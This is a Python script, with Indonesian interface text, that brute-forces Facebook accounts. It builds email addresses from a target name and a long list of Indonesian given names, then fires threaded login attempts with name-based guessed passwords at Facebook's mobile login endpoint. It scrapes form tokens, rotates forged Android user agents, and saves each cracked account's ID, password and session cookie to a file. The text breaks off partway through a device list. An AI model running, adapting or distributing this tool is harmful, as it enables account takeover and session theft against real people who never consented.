import os, re, bs4, sys, json, rich, time, random, datetime, requests; from time import sleep, strftime; from rich.console import Console; from rich.panel import Panel; from random import choice as rc; from random import randint as rr; from random import randrange as rg; from concurrent.futures import ThreadPoolExecutor; now = datetime.datetime.now(); dta = {'1':'Jan','2':'Feb','3':'Mar','4':'Apr','5':'Mei','6':'Jun','7':'Jul','8':'Agu','9':'Sepr','10':'Okt','11':'Nov','12':'Des'}; tgl = now.day; bln = dta[(str(now.month))]; thn = now.year; okc = ('OK-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); cpc = ('CP-'+str(tgl)+'-'+str(bln)+'-'+str(thn)+'.txt'); ok,cp,loop,id,id2,idf,P,M,K,B,H,N,bsp,ses = 0,0,0,[],[],[],'\x1b[1;97m','\x1b[1;91m','\x1b[1;93m','\x1b[1;94m','\x1b[1;92m','\x1b[0m',bs4.BeautifulSoup,requests.Session()

def Main_Menu():
	NiawMXV(); nama = Console().input(' > nama target: '); dump = Console().input(" > total clone: "); CC   = 0
	for xv in range(int(dump)):
		AA = nama; BB = Inisial(); CC+=1; cc = str(rr(0,999)); DD = rc(['',f'@{rc(["gmail"])}.com']); EE = rc([f'{AA}{rc(["",".",""])}{BB}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{BB}{rc(["",".",""])}{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{rc([f"{CC}",f"{cc}"])}{DD}',f'{AA}{rc(["",".",""])}{BB}{DD}',f'{BB}{rc(["",".",""])}{AA}{DD}']); FF = f'{EE}|{nama}'
		if FF in id: pass
		else: id.append(FF)
		print(f" > terkumpul {len(id)} email",end=("\r")); sleep(0.0007)
	Eksekusi()
H = "\033[1;97m"   # Putih terang
P = "\033[1;92m"   # Hijau terang
K = "\033[1;93m"   # Kuning terang
M = "\033[1;91m"   # Merah terang
C = "\033[1;96m"   # Cyan terang
B = "\033[1;94m"   # Biru terang
N = "\033[0m"      # Reset warna
ugen=[]
    
def Eksekusi():
	for x in id: id2.append(x)
	NiawMXV(); Console(width=50).print(Panel(f"[underline][bold #FF00D4]* [bold #FFFFFF]crack [bold #00FF00]{len(id)}[bold #FFFFFF] email[bold #FF00D4] *[/underline]",style="bold purple",width=50),justify="center"); print()
	with ThreadPoolExecutor(max_workers=30) as MethodCrack:
		for uids in id2:
			user = uids.split('|')[0]; nmfl = uids.split('|')[1].lower(); nama = nmfl.split('|')[0]; pasw = ['ganteng',nama,nama+'12',nama+'01',nama+'02',nama+'1234567',nama+'22',nama+'123',nama+'1234',nama+'12345',nama+'123456',nama+' '+nama]
			MethodCrack.submit(Async,user,pasw,nmfl)
	print('\n'); Console().print(f'[bold #FFFFFF] > crack [bold #00FF00]{len(id)}[bold #FFFFFF] email selesai | akun ok:[bold #00FF00]{ok} [bold #FFFFFF]akun cp:[bold #FFFF00]{cp}'); exit()

def Async(user, pasw, nmfl):
	ses = requests.Session()
	rc = random.choice
	rr = random.randint
	usr = user.split('@')[0]
	global loop,ok,cp
	print(f"{C} [Jp Bos Zeck]\033[0;m\033[1;32m {B}[{loop}] {P}[{ok}] {P}", end = ("\r"))
	ua = ua_fb_2026()
	for pw in pasw:
		try:
			requ = ses.get('https://x.prod.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8').text
			kueh = (f'{";".join([ "%s=%s"%(keys, value) for keys, value in ses.cookies.get_dict().items() ])}')
			data = {
				'm_ts':re.search('name="m_ts" value="(.*?)"',str(requ)).group(1),
				'li':re.search('name="li" value="(.*?)"',str(requ)).group(1),
				'try_number':'0',
				'unrecognized_tries':'0',
				'email':f'{user}',
				'prefill_contact_point':f'{user}',
				'prefill_source':'browser_dropdown',
				'prefill_type':'password',
				'first_prefill_source':'browser_dropdown',
				'first_prefill_type':'contact_point',
				'had_cp_prefilled':'true',
				'had_password_prefilled':'true',
				'is_smart_lock':'false',
				'bi_xrwh':re.search('name="bi_xrwh" value="(.*?)"',str(requ)).group(1),
				'bi_wvdp':'{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false,"iframeProto":"function get contentWindow() { [native code] }","remap":false,"iframeData":{"hwc":false,"has_dnt":true,"has_standalone":false,"wnd_toStr_toStr":"function toString() { [native code] }","hasPerm":false,"has_seWo":true,"has_meDe":true,"has_creds":true,"has_hwi_bt":false,"has_agjsi":false}}',
				'encpass':f'#PWD_BROWSER:0:{int(datetime.datetime.now().timestamp())}:{pw}',
				'fb_dtsg':re.search('{"dtsg":{"token":"(.*?)"',str(requ)).group(1),
				'jazoest':re.search('name="jazoest" value="(.*?)"',str(requ)).group(1),
				'lsd':re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'__dyn':'',
				'__csr':'',
				'__req':rc(['1', '2', '3', '4', '5', '6', '7', '8', '9']),
				'__fmt':'1',
				'__a':re.search('"encrypted":"(.*?)"',str(requ)).group(1),
				'__user':'0'
			}
			head = {
				'Host': 'm.facebook.com',
				'content-length': f'{len(str(data))}',
				'sec-ch-ua': '"Android WebView";v="108", "Chromium";v="108", "Not.A/Brand";v="99"',
				'sec-ch-ua-mobile': '?0',
				'user-agent': ua,
				'x-response-format': 'JSONStream',
				'content-type': 'application/x-www-form-urlencoded',
				'x-fb-lsd': re.search('name="lsd" value="(.*?)"',str(requ)).group(1),
				'sec-ch-ua-platform-version': '"9.0.0"',
				'x-requested-with': 'XMLHttpRequest',
				'x-asbd-id': '129477',
				'sec-ch-ua-full-version-list': '"Android WebView";v="108.0.6422.53", "Chromium";v="108.0.6422.53", "Not.A/Brand";v="99.0.0.0"',
				'sec-ch-ua-model': '"CPH2773"',
				'sec-ch-prefers-color-scheme': 'dark',
				'sec-ch-ua-platform': '"Android"',
				'accept': '*/*',
				'origin': 'https://m.facebook.com',
				'sec-fetch-site': 'same-origin',
				'sec-fetch-mode': 'cors',
				'sec-fetch-dest': 'empty',
				'referer': 'https://m.facebook.com/login/?next&ref=dbl&fl&login_from_aymh=1&refid=8',
				'accept-encoding': 'gzip, deflate, br, zstd',
				'accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'priority': 'u=1, i'
			}
			resp = ses.post(
				'https://x.prod.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',
				cookies = {'cookie': kueh}, data = data, headers = head, allow_redirects = False
			)
			if "c_user" in ses.cookies.get_dict():
				kue = ';'.join([x+'='+v for x,v in ses.cookies.get_dict().items()])
				uid = re.findall('c_user=(.*);xs',kue)[0]
				if uid in idf or user in idf:
					break
				idf.append(uid)				
				ok+=1
				print(f"{M}╔═══════════════════════════════════════════╗")
				print(f"{M}║ {P}[OK]{N} {C}LOGIN BERHASIL!{N}")
				print(f"{M}╠═══════════════════════════════════════════╣")
				print(f"{K}║ {H}UID : {P}{uid}{N}")
				print(f"{K}║ {H}PW  : {P}{pw}{N}")
				print(f"{K}╠═══════════════════════════════════════════╣")
				print(f"{P}║ {H}COOKIE : {P}{kue}{N}")
				print(f"{P}║ {H}UA     : {P}{ua}{N}")
				print(f"{P}╚═══════════════════════════════════════════╝")
				open('Okeh/'+okc,'a').write(f'{uid}|{pw}|{kue}\n')
				break
			else: continue
		except (requests.exceptions.ConnectionError): sleep(7)
	loop +=1


def NiawMXV():
	os.system('clear') 
	print(f"""{P}
⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣴⣾⣿⣿⣷⣶⣦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢠⣿⣿⣿⣿⣿⡿⠟⠛⠛⠛⠛⠻⣿⣿⣿⣆⠀⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣾⣿⣿⣿⣿⣁⠀⠀⠀⠀⣀⣤⣶⣿⣿⣿⣿⣧⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢰⣿⣿⣿⠛⠉⠛⠶⠀⠀⢐⠿⠋⠀⢨⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣿⢷⣿⣿⣶⠀⠀⠉⢶⣿⣿⠿⢿⣿⣿⣿⡄⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⢸⣿⣿⣇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣸⣿⣿⣿⡇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⣿⣿⣿⣶⡶⠂⠀⣀⠀⢀⡄⠐⢲⡾⣻⣿⣿⣿⠇⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⠀⢻⣿⣿⣯⢿⡶⣶⣿⣟⣿⡶⠶⣿⢣⣿⣿⣿⣿⠀⠀⠀⠀⠀
⠀⠀⠀⠀⠀⠀⣀⣾⣿⣿⣿⣧⠛⠒⠠⣤⣤⠶⠾⢣⣿⣿⣿⣿⣿⣤⣀⠀⠀⠀
⢀⣠⣤⣶⣶⣿⣿⣿⣿⣿⣿⣿⣷⡄⠀⢿⣿⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣶
⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣶⣾⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿
""")
def Inisial(): return rc(['aca','acha','ai','aii','adawiah','adawiyah','ade','adell','adel','adellaa','adelia','adellia','adeliya','adiba','adifa','adinda','aeni','aidah','aini','ainun','aira','asiah','aisah','aisyah','afifah','afipah','alawiah','alawiyah','ajahra','ajeng','ajeung','ajig','ajijah','ajizah','alesha','alia','alika','alimah','aliya','alifa','alifah','aliva','alivah','aliyah','almeera','almira','ama','amalia','amaliah','amaliyah','amanda','amidah','amira','aminah','ana','anantasia','anantasya','anastasia','anastasya','andini','ani','anisa','anita','any','anying','anyun','anggraeni','anggraini','anggi','anggita','anggun','anugerah','anugrah','anjing','apifah','apipah','april','aprilia','aprillia','apriliani','apriliyani','aprilianti','apriliyanti','aqila','aqilla','ara','arra','arafah','arrafah','areta','aretha','arofah','arin','arini','ariani','arista','ariyani','aryani','aryanti','arianti','ariyanti','arumi','arsita','arsyita','arsila','asyila','asypa','asifa','asipa','asmi','asmara','asih','asilah','asti','astiani','astiyani','astuti','atik','atika','atikah','ayg','ayank','ayang','ayra','ayu','ayyu','ayunda','ayuni','ayudia','ayudiya','ayudiah','ayuningsih','azzahra','azijah','azizah','azmi','azmy','azura','babi','baby','badriah','bajingan','bagong','bangsat','bela','bella','bibah','bila','billa','bintang','bulan','bunga','bungsu''cabi','cabhy','caby','cabby','caca','cca','cahaya','cahya','cahyani','camelia','cangcut','cans','canss','cantik','cantika','celsi','celsie','centil','chaca','chacha','chelsi','chelsie','chelsea','chika','cia','cci','cici','cika','cimok','cindy','cinta','cintia','cintaku','cintya','cintiya','citra','chindy','cucu','ccu','culun','cupu','cynthia','cyntia','dafina','dahlia','dania','daniah','daniyah','danyyah','daswita','dara','davina','dea','dede','dela','della','delia','delicia','denia','deniah','deniyah','deon','debi','deby','debby','denita','denisa','devi','devia','devie','desnia','desnie','divita','desi','desita','deswita','dwi','dewi','dewita','dhe','dhea','dheniah','dhewi','dhita','dhiya','dia','diah','diajeng','dian','diana','diandra','diannova','dias','dika','diksa','dila','dilla','dipa','diva','dianda','dila','dilla','dira','dina','dinda','dini','diniah','diniyah','disa','disha','dita','diya','diyah','dona','dyra','dyah','eka','eira','elfi','elia','eliana','elin','elina','elisabeth','elis','ellis','elise','eliya','eliza','elizabeth','ella','elma','elmira','elisa','elisha','elisia','elisiya','elisya','elisyha','elfina','elsa','evi','epi','elin','elsy','elva','elvira','elly' 'elvina','emi','emilia','emy','emyliya','ema','emma','endah','endang','erna','erni','erika','erlinda','esti','estiana','eis','eti','etie','ety','euis','eva','evita','evitamala','evalina','ewe','farah','farrah','fadila','fadla','fadhila','fadhla','faija','faiza','faizza','faizah','fani','fanni','fany','fanny','fanya','farida','faridha','fatin','fatim','faujia','faujiah','fauzia','fauziah','fauziya','fauzyah','fawziyah','fazila','fazilla','fazeela','fatima','fatimah','fathimah','felisia','felisya','ferli','ferly','fika','fina','fiona','fionna','fida','fira','firli','firly','fitri','fitriani','fitriyani','fitryani','frisilia','frisiliya','freya','friska','fuji','fuzi','gaby','gabby','gadis','geby','gebby','gelsey','gendis','gemoy','gea','ghea','gia','ghia','ghina','ghita','gina','ginna','gisela','gisella','gita','gitta','greta','gresik','giska','ganesha','geisha','habibah','hafsa','halima','halia','halimah','hafiza','hafsah','hafiza','hafizah','hana','handayani','handayanti','hanna','hannah','hani','hany','hanny','hanifah','hanipah','hania','haniya','hartini','hasanah','hatima','hatimah','hilda','hilma','hilmawati','hemalia','hepti','hesa','hessa','hesha','hesti','hestia','hesty','helga','hasna','hopi','hopipah','hoho','hotima','hotimah','hikmah','humaida','humayda','husna','hurairah','ica','icaa','icha','ichaa','ifa','iffa','ilmira','ina','inna','inaara','inara','inarah','inayah','indah','indira','indyra','indri','indry','insan','insani','imelda','ina','irma','irena','ika','ijah','intan','intanrahayu','ira','isabela','isabella','isan','isana','isyana','isah','isma','ismawati','ismawaty','ismi','isnaeni','iza','izah','jafira','jahira','jalilah','jahra','jamilah','jannah','jasmin','jayanti','jelita','jeni','jeny','jenita','jesica','jesika','jihan','jihana','jingga','juwita','juli','julia','juliana','juliet','jumaina','jumainah','juniarti','junaina','juwitta','jwita','kaila','kalia','kaira','khaira','karin','karina','kartika','kadek','kania','kaniya','kartini','kasih','kamala','kamila','karomah','karisa','karsih','katrina','keira','khaira','khaila','khafifah','khadijah','khairun','khairunisa','khalifah','khatimah','khopipah','kiki','kim','kila','kira','kirani','komarudin','kumala','kumalasari','kokom','komala','komalasari','kontol','kotima','kotimah','kulsum','kultsum','kuntul','kurnia','kurniati','kurniyati','kursina','kurniasih','kusmiati','kusmiyai','laela','lala','laila','lati','laty','latifalh','lathifah','layla','laras','larasati','lasmini','laura','laudia','laudya','lela','lesmana','lena','leni','leny','lestari','lestary','lesti','lesty','levita','lia','lida','lidia','lidya','liana','liani','lilis','lina','linda','lintang','lis','lisa','lisha','lisna','lisnawati','lisnawaty','listi','listy','listia','listya','liza','liya','liyani','liza','lomrah','lulu','luna','lusi','lusy','luvita','lyna','lysa','mae','maemunah','maesarah','maesaroh','mala','maida','maidah','maira','maisa','maisha','malika','maimunah','magfirah','mahalini','maharani','maharini','mahda','mahmud','manda','mandha','maria','mardiah','mardianti','mardiyanti','mardyah','mardiyah','mariah','mariam','mariyah','maryati','mariati','mariyati','markonah','mariyam','marisa','marissa','martina','martinah','martini','maryamah','marwah','maryanti','marwati', 'marwaty','marzia','marziya','masitoh','masriah','masriyah','maulida','maulidia','maulidya','maulidiya','mawar','maya','mayra','maymuna','maymunah','marziah','meca','mecca','meka','mega','melani','melany','meli','melinda','melisa','melly','memek','mia','mila','mimin','mira','mirna','miranda','miya','mufliha','munaroh','munawarah','munawaroh','murni','murniati','murniyati','muslima','mulimah','muti','mutmainah','muthmainnah','mutmaidah','muthmaidah','mutia','mutiara','nabila','nada','nadhin','nadia','nadira','nadhira','nadin','nadiya','nafisa','nafisha','nafisah','nagita','naila','naira','najwa','nana','nanda','nani','natalia','nataliya','natasia','natasya','natasyha','naura','nayara','nayla','naswa','nashwa','nazwa','nia','nida','nifa','nina','nindi','nindy','ningrum','ningsih','nita','nitatalia','niken','nisa','nissa','nurul','nopi','novi','novita','nurull','nunung','nuri','nurianti','nurjanah','nuryanti','oca','octa','octavia','olivia','okta','oktavia','ocha','padma','putri','puspa','pipit','paramita' 'permata','permatasari','purnama','purnamasari','puspa','putri','puteri','pitri','pratiwi','pramita','priska','prisilia','qaila','qasimah','qila','qiqi','rana','rafa','raisa','rahma','rahmah','rahmawati','rahmawaty','rhma','rahnadani','rahmadhani','ramadani','ramadhani','rani','rany','rasya','rati','rara','rere','refa','repa','reva','repani','revani','rena','renatri','reni','renata','rani','ratna','rina','rida','rifda','rifdah','rini','ririn','rianti','rianty','riyanti','riyanty','riska','rizka','rohma','rohmah','rohmawati','rohmawaty','rosdiana','rosdiani','ross','rossa','rosita','rosalina','rosmanah','rum','rumaidah','ruwaidah','ryzka','sahara','saleha','salimah','sabrina','safa','saffa','safna','safira','saidah','sahira','sakila','sakinah','sakira','salma','salsa','salsabila','salsabyla','salwa','santi','sani','santy','santika','sara','shafira','shavira','shakira','shafna','shaleha','shalehah','shakeera','shakila','shalihah','shanti','shanty','shantika','shani','shaniyah','shofy','shofiyah','shofiyyah','sholeha','sholehah','sifa','silawati','sipa','silpi','silvi','siska','sinta','suci','selly','safitri','saputri','sarah','saras','sarasvati','saraswati','sari','sasmita','setiawati','sisil','siti','sity','siregar','simanjuntak','soleha','solehah','sonia','shonia','soraya','sukma','suci','sumi','sumiyati','suratni','surtini','suratmi','sasanti','susanty','susi','susilawati','susilawaty','susy','sutari','suteni','susu','syafaa','syakila','syakira','syifa','sypa','sya','syahla','syahira','syafira','syavira','tabita','tabhita','talia','taliah','talita','talitha','tami','tamimah','tammy','tania','taniya','tari','tarisa','tasya','taskia','taskiya','tazkia','tazkiya','tesa','tea','thea','thiara','tia','tias','tiastuti','tiara','tifani','tifany','tika','tina','tita','titian','titie','titin','tri','triani','tsunade','tsusilawati','tuti','tya','tiktok','tikotok','uci','uchi','ulfa','ulan','ulandari','ulandary','ulia','uliya','ulya','ulpah','ulpa','ulva','umayah','umi','umy','umiyah','umiati','umiaty','umiyati','utami','utari','ute','ubaidah','umaira','umairah','usna','usnah','uswah','uswatun','uswatunhasanah','uzwatun','vani','vany','vanya','valen','valentina','vanesa','vera','victoria','viktoria','via','vina','vivi','vivie','vianita','viola','veronica','veronika','viani','vianika','viana','viera','valencia','valensia','vita','vitaloka','vilmei','vega','viona','visi','wafa','wafda','wahdah','wardani','wardhani','wahdaniyah','wahidah','wanda','wangi','wardah','wastiqah','wati','watiah','watilah','watiyah','watsiqah','wasikoh','welas','wening','widi','widia','widhia','widhiya','widiya','widiasari','widiawati','widy','wikayah','wilona','windi','windiawati','windiasari','wina','wini','wiqayah','wikoyah','wiwin','windy','wulan','wulandari','xyz','xyzz','tzy','tyz','mojang','gemoy','imut','kebi','tembem','tete','gelis','geulis','ytta','kasep','ganteng','wibu','gojo','gojosatoru','santik','gerengseng','bokep','ewe','xtc','brigez','01','02','03','04','05','06','07','08','09','010','001','002','003','004','005','006','007','008','009','0010','00','000','0000','12345','123456','yani','yanti','yanto','yanty','yasira','yeni','yuli','yulia','yuliya','yulya','yulianti','yuliyanti','yuni','yunita','yuningsih','yuyu','yuyun','zahra','zafira','zahira','zahiyah','zahra','zahrani','zahrany','zahwa','zainab','zakiah','zaqiyah','zenab','zalfa','zalpa','zalva','zaskia','zaskiya','zaskiani','zaskiyani','zizah','zenia','zera','zhafira','zhafirah','zharifa','zharifah','zia','zizi','zyzy','zubaidah','zuhrah','zulfa','zulpa','zulva','zunaira','zunea','handayani','ardiana','ardiansyah','ardiansah','ardianto','ardianti','aprianto','aprianti','apriadi','alhidayat','aldebaran','alfahri','alghazali','dirgantara','dermansah','derwansah','dermanto','darmanto','darmansyah','daryanto','dermawan','darmawan','darmansyah','dermansah','derwansyah','erlangga','firmansah','firmansyah','fadilah','gunawan','ginanjar','gustawan','gustomi','hartono','haryanto','haryadi','hariadi','hanupis','herdiansah','herdiansyah','ferdiansyah','febriansyah','febriansah','ferdiansah','ferdianto','febrianto','febrian','irawan','jaelani','jaeludin','jaylani','kurnia','kurniawan','kusmayanto','kadarsah','lesmana','laksana','lasmana','maulana','mulyana','mulyono','maulidan','mulyadi','nugraha','nugroho','nurdiansyah','murdiansah','nurahman','nurohman','nurhidayat','nuraripin','aripin','nurohman','peratama','pertama','prasetya','prasetyo','pratama','purnomo','ramadhan','ramadan','ramadani','ramadhani','ramdhani','ramdhan','ramdan','santoso','susanto','supomo','sudarso','sulaeman','sulaiman','solihin','sodikin','suharto','sutomo','sumarna','sumarno','suherman','suhaedi','suhardi','suhendi','sucipto','saepuloh','wijaya','wijayanto','wiguna','widodo','wirawan','wiraditya','william','irwansyah','irwana','irwansyah','irianto','iriadi','saepudin','saripudin','saefudin','saefuloh','sarifudin','wicaksono','azizah','azzizah','azahra','azzahra','aisyah','adila','aprianti','aprilia','apriliani','asnawati','alisa','asyifa','assyifa','citrawati','derwati','darwati','damayanti','damayanto','budianti','budianto','belina','belinda','elmira','ananda','amanda','ananta','citata','fitriani','fitriana','ferawati','ferwati','fatmawati','hodizah','holifah','afifah','apipah','aropah','jatnika','janurin','kurniasih','melinda','melati','melani','marwati','maryanti','maryani','maryuni','maryati','nursafitri','nuraisyah','nurazahra','nurazzahra','nurazizah','nurazzizah','nurcahaya','nursabila','nurfitria','nursolihin','nursyakila','nursuci','nurfadilah','nurasih','fatimah','nurfatimah','nuradila','nurnadifah','nadifah','pratiwi','pertiwi','prasti','purwasih','purnama','agustina','evansyah','rusmini','rusmiati','rusmana','rosalina','rosmawati','rostiwi','rosyani','anggraena','anggraini','anggraeni','nurjanah','salsabila','sabila','safitri','suarsih','sukaesih','sutini','sumarni','suherni','suharni','solifah','syakila','sandini','sunengsih','suningsih','ningsih','nengsih','widiawati','widyawati','yuningsih','yunengsih','yulianti','julianti','yulianto','julianto','safira','syafira','wahyudi','wahyudin','andrian','ardiani','andhiani','asmawati','asmara','asifa','ekaputri','nurhasanah','hasanah','marlina','adit','aditya','ahmad','arip','ardi','anto','agus','azis','ajis','apep','arya','aryo','asep','beni','beben','bang','boni','badru','badrus','cahyo','diki','dika','andika','deden','dadan','dudung','dadang','didin','dimas','doni','dafa','dedi','dudi','elan','elang','angga','anggi','edi','fasha','firman','fatir','fatah','fazri','fikri','engkus','endang','galih','galuh','galang','gilang','aldi','alpin','gagan','haris','hari','heri','herul','iwan','idan','idun','idin','fajar','jejen','jejee','jordi','joni','jajang','oji ','fauzi','putra','feri','padil','ari','hendi','eded','rendi','randi','roni','riski','rizki','risky','rizky','riki','rifki','ilham','hasan','rifan','teten','ade','ucup','udin','wili','andi','yayan','yana','yono','yanto','bili','azim','arlin','alin','anita','anisa','andin','andini','araa','citra','cinta','cicin','cici','cicih','desi','desti','dewi','dwi','destika','deswita','delin','delina','diniyah','dini','dina','dani','eci','esih','ela','elin','enci','erni','erna','empit','fitri','fifit','fina','ilah','ina','indah','inem','ida','iis','jani','kesya','kania','kaka','kiki','lala','loli','lesti','manda','amanda','mawar','entin','nana','nasya','nesya','nazwa','nanda','nandita','nadia','nadin','nandita','nuri','aida','aini','ninis','ndah','putri','puput','mutia','nur','resti','risya','rina','rini','ririn','rida','dila','adel','amel','mela','adelia','sifa','syifa','sinta','sintia','sindi','sinar','soleh','sodik','sindi','sindy','septi','sonia','senia','senny','seli','serli','serly','fatma','tia','tika','titin','cucu','cecep','widia','widi','widya','delia','wina','wiwi','wiwit','wika','riska','hesti','aulia','andri','aulia','yani','yuni','yeni','yeyen','lasma','zahra','zahwa','cahya','kekey','keke','lia','dahlia','denis','siti','wulan','herlina','lina','lani','leni','deti','dela'])

def ua_fb_2026():

    android_version = random.choice([
        "10", "11", "12", "13", "14", "15"
    ])

    fbav_major = random.randint(520, 620)
    fbav_build1 = random.randint(0, 0)
    fbav_build2 = random.randint(0, 0)
    fbav_build3 = random.randint(10, 90)
    fbav_build4 = random.randint(50, 250)
    fbav = f"{fbav_major}.{fbav_build1}.{fbav_build2}.{fbav_build3}.{fbav_build4}"
    fbbv = random.randint(400000000, 900000000)
    density = random.choice([
    "0.75",
    "1.0",
    "1.25",
    "1.33",
    "1.5",
    "1.75",
    "2.0",
    "2.1",
    "2.15",
    "2.2",
    "2.25",
    "2.3",
    "2.4",
    "2.45",
    "2.5",
    "2.55",
    "2.6",
    "2.65",
    "2.7",
    "2.75",
    "2.8",
    "2.85",
    "2.9",
    "3.0",
    "3.05",
    "3.1",
    "3.15",
    "3.2",
    "3.25",
    "3.3",
    "3.35",
    "3.4",
    "3.45",
    "3.5",
    "3.55",
    "3.6",
    "3.65",
    "3.7",
    "3.75",
    "3.8",
    "3.85",
    "3.9",
    "4.0",
    "4.05",
    "4.1",
    "4.15",
    "4.2",
    "4.25",
    "4.3",
    "4.35",
    "4.4",
    "4.45",
    "4.5",
    "4.55",
    "4.6",
    "4.65",
    "4.7",
    "4.75",
    "4.8",
    "4.85",
    "4.9",
    "5.0",
    "5.1",
    "5.2",
    "5.25",
    "5.3",
    "5.4",
    "5.5",
    "5.6",
    "5.75",
    "5.8",
    "6.0"
])
    resolution = random.choice([
    ("480","854"),
    ("540","960"),
    ("540","1200"),
    ("720","1280"),
    ("720","1440"),
    ("720","1520"),
    ("720","1560"),
    ("720","1600"),
    ("720","1612"),
    ("720","1640"),
    ("720","1650"),
    ("720","1680"),
    ("900","1600"),
    ("900","1800"),
    ("1080","1920"),
    ("1080","2160"),
    ("1080","2220"),
    ("1080","2240"),
    ("1080","2280"),
    ("1080","2300"),
    ("1080","2312"),
    ("1080","2340"),
    ("1080","2376"),
    ("1080","2388"),
    ("1080","2400"),
    ("1080","2408"),
    ("1080","2412"),
    ("1080","2436"),
    ("1080","2460"),
    ("1080","2520"),
    ("1080","2640"),
    ("1200","2670"),
    ("1200","2712"),
    ("1220","2652"),
    ("1220","2712"),
    ("1240","2772"),
    ("1440","2560"),
    ("1440","3040"),
    ("1440","3088"),
    ("1440","3120"),
    ("1440","3168"),
    ("1440","3200"),
    ("800","1280"),
    ("800","1340"),
    ("1200","1920"),
    ("1200","2000"),
    ("1600","2560"),
    ("1260","2800"),
    ("1280","2856"),
    ("1320","2868"),
    ("1344","2992"),
    ("1080","2316"),
    ("1080","2392"),
    ("1080","2424"),
    ("1080","2448"),
    ("1080","2480"),
    ("1224","2700"),
    ("1260","2712"),
    ("1440","3216")
])
    width = resolution[0]
    height = resolution[1]
    device_data = random.choice([
    {
        "brand":"Xiaomi",
        "manufacturer":"Xiaomi",
        "model":"2312DRA50G",
        "device":"Redmi Note 13 Pro",
        "cpu":"mt6877v",
        "build":"UKQ1.231207.002"
    },
    {
        "brand":"Xiaomi",
        "manufacturer":"Xiaomi",
        "model":"24069RA21C",
        "device":"Redmi Note 14 Pro",
        "cpu":"mt6899",
        "build":"AP3A.240617.008"
    },
    {
        "brand":"Xiaomi",
        "manufacturer":"Xiaomi",
        "model":"22101316G",
        "device":"Redmi Note 12 Pro 5G",
        "cpu":"mt6877v",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"Xiaomi",
        "manufacturer":"Xiaomi",
        "model":"2201116PG",
        "device":"Redmi Note 11 Pro",
        "cpu":"mt6781",
        "build":"SKQ1.211006.001"
    },
    {
        "brand":"POCO",
        "manufacturer":"Xiaomi",
        "model":"23113RKC6G",
        "device":"POCO X6 Pro",
        "cpu":"mt6897",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"POCO",
        "manufacturer":"Xiaomi",
        "model":"23049PCD8G",
        "device":"POCO F5",
        "cpu":"qcom",
        "build":"TKQ1.221114.001"
    },
    {
        "brand":"POCO",
        "manufacturer":"Xiaomi",
        "model":"22101320G",
        "device":"POCO X5 Pro",
        "cpu":"qcom",
        "build":"TQ3A.230805.001"
    },
    {
        "brand":"Xiaomi",
        "manufacturer":"Xiaomi",
        "model":"23078RKD5G",
        "device":"Xiaomi 13T",
        "cpu":"mt6895",
        "build":"UKQ1.230917.001"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-A546E",
        "device":"Galaxy A54 5G",
        "cpu":"s5e8825",
        "build":"TP1A.220624.014"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-A346E",
        "device":"Galaxy A34 5G",
        "cpu":"mt6877v",
        "build":"TP1A.220624.014"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-A156E",
        "device":"Galaxy A15 5G",
        "cpu":"mt6835",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-M146B",
        "device":"Galaxy M14 5G",
        "cpu":"s5e8535",
        "build":"TP1A.220624.014"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-S928B",
        "device":"Galaxy S24 Ultra",
        "cpu":"qcom",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-S921B",
        "device":"Galaxy S24",
        "cpu":"qcom",
        "build":"UP1A.231005.007"
    },
    {
        "brand":"samsung",
        "manufacturer":"samsung",
        "model":"SM-A736B",
        "device":"Galaxy A73 5G",
        "cpu":"qcom",
        "build":"TP1A.220624.014"
    },
    {
        "brand":"realme",
        "manufacturer":"realme",
        "model":"RMX3782",
        "device":"realme 12+ 5G",
        "cpu":"mt6878",
        "build":"UKQ1.230924.001"
    },
    {
        "brand":"realme",
        "manufacturer":"realme",
        "model":"RMX3840",
        "device":"realme 13 Pro+",
        "cpu":"qcom",
        "build":"AP3A.240617.008"
    },
    {
        "brand":"realme",
        "manufacturer":"realme",
        "model":"RMX3710",
        "device":"realme C67",
        "cpu":"mt6768",
        "build":"TP1A.220624.014"
    },
    {
        "brand":"realme",
        "manufacturer":"realme",
        "model":"RMX3630",
